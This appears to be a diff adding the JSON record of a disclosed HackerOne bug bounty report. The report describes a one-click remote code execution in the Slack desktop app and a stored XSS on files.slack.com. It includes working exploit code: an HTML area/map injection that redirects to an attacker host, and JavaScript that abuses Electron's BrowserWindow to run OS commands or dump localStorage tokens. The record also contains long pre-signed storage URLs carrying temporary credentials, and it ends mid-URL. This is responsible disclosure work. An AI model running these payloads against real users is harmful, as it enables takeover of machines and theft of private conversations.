@@ -1,0 +1,205 @@
+{
+  "id": 783877,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODM4Nzc=",
+  "url": "https://hackerone.com/reports/783877",
+  "title": "Remote Code Execution in Slack desktop apps + bonus",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-27T00:05:37.110Z",
+  "submitted_at": "2020-01-27T00:05:37.110Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "oskarsv",
+    "url": "/oskarsv",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-28T18:04:36.897Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-26T17:57:23.220Z",
+  "team_member_agreed_on_going_public_at": "2020-08-28T18:04:36.762Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\nWith any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux). \n\nTo demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore [#738229](https://hackerone.com/reports/738229). \n\nFinally, as an added bonus, a XSS vulnerability on https://files.slack.com is demonstrated as a possible RCE payload store. I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.\n\n{F697022}\n\n# Technical description and steps of reproduction\n\nExploitation steps:\n1. Upload file on your HTTPS enabled server with the RCE payload\n2. Prepare a Slack Post with HTML injection\n3. Share Post with channel or user\n\nUser steps:\n1. click on a large post with an enticing image - code executed on PC\n\nActual path after user click:\n1. HTML redirects user's desktop app to attacker website in `_top` frame\n2. Attacker website replies with RCE javascript\n3. exploit bypasses Slack desktop app env, leaks an Electron object and via it executes arbitrary commands on user's PC. \n\n**NOTE**: This could also be done with any XSS/in-app redirect vulnerability.\n\n## HTML injection - directly editing Slack Post structure as JSON\n\n### 1. create a new Slack Post with some title and some content\n\nWhen you create a new Slack Post, it creates a new file on https://files.slack.com with the following JSON structure:\n```\n{\"full\":\"<p>content<\\/p>\",\"preview\":\"<p>content<\\/p>\"}\n```\n{F696858}\n\nThe URL to a private file can be found by visiting the private file link returned by the `/api/files.info` call:\n{F696861}\n\nThe private file URL is in the format `https://files.slack.com/files-pri/{TEAM_ID}-{FILE_ID}/TITLE` under `url_private` response from `/api/files.info`. The Slack Post JSON structure can be observed by simply visiting the private file link.\n\n### 2. Injecting HTML payload\n\nIt's possible to directly edit this JSON structure, which can contain arbitrary HTML. Javascript execution is restricted by CSP and various security protections are in place for HTML tags (i.e. banned `iframe`, `applet`, `meta`, `script`, `form` etc. and `target` attribute is overwritten to `_blank` for `A` tags). \n\nHowever, it is still possible to inject `area` and `map` tags, which can be used to achieve a one-click-RCE.\n\nTo edit the JSON structure directly and inject in that way, you can use the web UI provided by Slack itself:\n```\nhttps://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit\n```\n`YOUR-MEMBER-ID` you can copy from your profile view, it's in the format `UXXXXXXXX`\n\n{F696964}\n\n**Alternatively**, it's possible to upload a Javascript/JSON snippet and change it's filetype to `docs` by editing the `filetype` parameter with a HTTP proxy.\n\nUpload payload.json with the JSON below:\n{F696941}\n\nChange filetype by intercepting request when when editing file, e.g. change title and intercept HTTP request to `/api/files.edit`:\n{F696942}\n\nSince no HTML embedding is possible and various interesting tags are restricted + Javascript is not available because of existing protections and a defined CSP, a new HTML injection payload was developed:\n```\n<img src=\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-img\">\n<map name=\"slack-img\">\n<area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://attacker.com/t.html\" target=\"_self\">\n</map>\n```\nNote this payload requires an image to reference with the attribute `usemap`. This can be hosted in Slack infrastructure by uploading an image to Slack beforehand.\n\nJSON to provide for Slack Post edit @ `https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit` payload.json:\n```\n{\n  \"full\": \"asd\",\n  \"preview\": \"<img src=\\\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\\\" width=\\\"10000\\\" height=\\\"10000\\\" usemap=\\\"#slack-img\\\"><map name=\\\"slack-img\\\"><area shape=\\\"rect\\\" coords=\\\"10000,10000 0,0\\\" href=\\\"https://attacker.com/t.html\\\" target=\\\"_self\\\"></map>\"\n}\n```\n\n### 3. RCE exploit code - hosted on attacker's website \n\nthe URL link within the `area` tag would contain this HTML / JS exploit for Slack Desktop apps which executes any attacker provided command:\n```\n<html>\n<body>\n<script>\n  // overwrite functions to get a BrowserWindow object:\n  window.desktop.delegate = {}\n  window.desktop.delegate.canOpenURLInWindow = () => true\n  window.desktop.window = {}\n  window.desktop.window.open = () => 1\n  bw = window.open('about:blank') // leak BrowserWindow class\n  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration\n  nbw.loadURL('about:blank') // need to load some URL for interaction\n  nbw.webContents.executeJavaScript('this.require(\"child_process\").exec(\"open /Applications/Calculator.app\")') // exec command\n</script>\n</body>\n</html>\n```\n\nFor windows just replace `open /Applications/Calculator.app` with `calc` or anything else.\n\nTo test the RCE payload, you can open Developer Tools on any Slack Desktop app and paste only the Javascript code in console. It achieves RCE and illustrates that it's independent of any entry point - i.e. redirect within the desktop app.\n\n### 4. easy access to all private data without command execution \n\nThe payload can be easily modified to **access all private conversations, files, tokens etc.** without executing commands on the user's computer: \n```\n<html>\n<body>\n<script>\n  window.desktop.delegate = {}\n  window.desktop.delegate.canOpenURLInWindow = () => true\n  window.desktop.window = {}\n  window.desktop.window.open = () => 1\n  bw = window.open('about:blank')\n  nbw = new bw.constructor({show: false}) // node not necessary for this demo\n  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment \n  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')\n</script>\n</body>\n</html>\n```\n\n{F697023}\n\nEssentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a \"tunnel\" via `BrowserWindow` to execute arbitrary Javascript, i.e. a weird XSS case with full access to anything the Slack app has - easy access to private channels, conversations, functions etc.\n\n# files.slack.com - alternate payload store and an XSS in itself\n\nDuring search for an entry point for the RCE exploit, it was discovered that emails (when sent as plaintext) are stored unfiltered on Slack servers at https://files.slack.com and with direct access returned as text/html, without force-download.\n\nThis HTML file upload functionality can be used for storing the RCE payload - no need to use own hosting. \n\n{F697020}\n\nSince it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack. There are no security headers or any restrictions at all as far as I could tell and I'm sure some other security impact could be demonstrated with enough time. \n\n{F697019}\n\n## How to upload html to files.slack.com\n\nAny email client can be used, i.e. in macOS's default client you can press CMD+SHIFT+T to make an email plaintext, copy paste the RCE payload from above and embed it in your Slack Post HTML injection. \n\n{F697018}\n\nAs the \"Send To Slack\" email address, you have to use your custom email integration address or private email address - [instructions](https://slack.com/intl/en-lv/slack-tips/send-email-to-slack). Scroll to \"Send one email at a time into Slack with forwarding address\" for easy setup - no app integration or installs necessary.\n\nThe uploaded HTML file can then be found via the UI \"open original\" or by the same `/api/files.info` API call on e-mail file id and then visiting the `url_private` link.\n\n# TL;DR\n\n- HTML injection path via web UI - direct editing of Post file structure \n- alternatively HTML injection via file conversion from `Javascript/JSON` to `docs` - achieves same goal of editing Post structure directly\n- new pure HTML payload to redirect Slack Desktop app\n- new OS-agnostic Remote Code Execution payload  - requires any kind of in-app redirect to a malicious page \n- XSS in files.slack.com without restriction via e-mail \n- **all files of course must be shared with the recipients via the usual methods** otherwise private files are inaccessible\n\n## Impact\n\nRemote Code Execution in Slack desktop apps:\n- access to private files, private keys, passwords, secrets, internal network access etc.\n- access to private conversations, files etc. within Slack\n- payload could be made \"wormable\" - re-post to all user workspaces after click\n\nXSS in files.slack.com\n- arbitrary HTML content in *.slack.com - trusted page\n- phishing with fake HTML login page\n- can be used to store above RCE exploit",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 696858,
+      "file_name": "post-structure.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KHdKWNY1WKMusfyu1H6SFxEH?response-content-disposition=attachment%3B%20filename%3D%22post-structure.png%22%3B%20filename%2A%3DUTF-8%27%27post-structure.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fbd4fcc52ef258908868699de6ac37ce710d2c1315b6ab36538f1a2ddc6ff734",
+      "file_size": 109356,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 696861,
+      "file_name": "file-info-api.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p5eBziaDbo31vFxsjuFXiUz2?response-content-disposition=attachment%3B%20filename%3D%22file-info-api.png%22%3B%20filename%2A%3DUTF-8%27%27file-info-api.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ebb20cbac222c6b5119ed60af3b67bbd8e3d15c7f40dce32a793f9879407908",
+      "file_size": 249402,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 696941,
+      "file_name": "json-file.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7AyaC4wzk8eEimH6o2eBeLrd?response-content-disposition=attachment%3B%20filename%3D%22json-file.png%22%3B%20filename%2A%3DUTF-8%27%27json-file.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=198827e8f775fe41fedd1af4ab338189b73b4713ecf9b922933fca752e853350",
+      "file_size": 64055,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 696942,
+      "file_name": "http-proxy-change-filetype.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dVeVypFkramSsGhJmKaU5tEU?response-content-disposition=attachment%3B%20filename%3D%22http-proxy-change-filetype.png%22%3B%20filename%2A%3DUTF-8%27%27http-proxy-change-filetype.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b97f338240a6c29c8cd93f99e372c39dfe65d423558190c3b4baf91f1a508745",
+      "file_size": 108962,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 696964,
+      "file_name": "edit-via-web.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yZZWNS6c8cNKXEHEKnWRDUZT?response-content-disposition=attachment%3B%20filename%3D%22edit-via-web.png%22%3B%20filename%2A%3DUTF-8%27%27edit-via-web.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=af43fde4d4da08e0a96dc1e7d2bf32d69d0f59e2e789351881cfba05bddd8135",
+      "file_size": 82039,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 697018,
+      "file_name": "slack-email-xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UKzzmKVV89rEE59NKSVRuX15?response-content-disposition=attachment%3B%20filename%3D%22slack-email-xss.png%22%3B%20filename%2A%3DUTF-8%27%27slack-email-xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeN